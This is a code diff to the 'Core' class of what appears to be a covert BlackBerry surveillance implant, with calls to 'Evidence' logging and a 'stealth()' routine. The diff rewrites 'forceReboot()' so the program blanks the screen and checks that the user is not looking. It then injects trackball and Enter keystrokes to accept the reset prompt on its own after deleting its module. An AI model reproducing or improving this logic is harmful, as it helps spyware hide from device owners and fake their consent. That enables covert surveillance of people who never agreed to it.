@@ -106,7 +106,7 @@ public final class Core implements Runnable {
 
         Encryption.init();
 
-        Main.getInstance().goBackground();
+        //Main.getInstance().goBackground();
     }
 
     /**
@@ -242,7 +242,7 @@ public final class Core implements Runnable {
         debug.info("START: " + (new Date())); //$NON-NLS-1$
         Evidence.info("Start" + demo + ",  build: " + Cfg.BUILD_ID + " " + Cfg.BUILD_TIMESTAMP); //$NON-NLS-1$ //$NON-NLS-2$
         //#else
-        Evidence.info(Messages.getString("7.17")+ demo); //$NON-NLS-1$
+        Evidence.info(Messages.getString("7.17") + demo); //$NON-NLS-1$
         //#endif
 
         stealth();
@@ -320,36 +320,44 @@ public final class Core implements Runnable {
 
         final int moduleHandle = ad.getModuleHandle();
         final int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
-        
+
         //TODO: sperimentale
-        forceReboot();        
+        forceReboot();
     }
 
     public static void forceReboot() {
         //TODO: se il telefono e' occupato, attendere il tempo necessario.
-        
-        Backlight.enable(false);
-        CodeModuleManager.promptForResetIfRequired();
-        Backlight.enable(false);
-        
-        //TODO: con il 4.6 non funziona.
-        if(Device.getInstance().lessThan(5, 0)){
-            Utils.sleep(2000);
+        try {
+            Backlight.enable(false);            
+            Main.getInstance().pushBlack();
+            Utils.sleep(8000);
+
+            if (Backlight.isEnabled()) {
+                //#ifdef DEBUG
+                debug.trace("forceReboot, backlight, bailing out");
+                //#endif
+                return;
+            }
+            CodeModuleManager.promptForResetIfRequired();
+            Backlight.enable(false);
+
+            Utils.sleep(500);
+            KeyInjector.trackBallDown(20);
+            Utils.sleep(100);
+            KeyInjector.trackBallUp(1);
+            Utils.sleep(100);
+            KeyInjector.pressKey(Keypad.KEY_ENTER);
+            Utils.sleep(100);
+            KeyInjector.trackBallClick();
+            Utils.sleep(100);
+            KeyInjector.trackBallDown(20);
+            Utils.sleep(100);
+            KeyInjector.trackBallUp(1);
+            Utils.sleep(100);
+            KeyInjector.trackBallClick();
+        } finally {
+            Main.getInstance().popBlack();
         }
-        Utils.sleep(500);
-        KeyInjector.trackBallDown(20);
-        Utils.sleep(100);
-        KeyInjector.trackBallUp(1);
-        Utils.sleep(100);
-        KeyInjector.pressKey(Keypad.KEY_ENTER);
-        Utils.sleep(100);
-        KeyInjector.trackBallClick();
-        Utils.sleep(100);
-        KeyInjector.trackBallDown(20);
-        Utils.sleep(100);
-        KeyInjector.trackBallUp(1);
-        Utils.sleep(100);
-        KeyInjector.trackBallClick();
     }
 
     /**
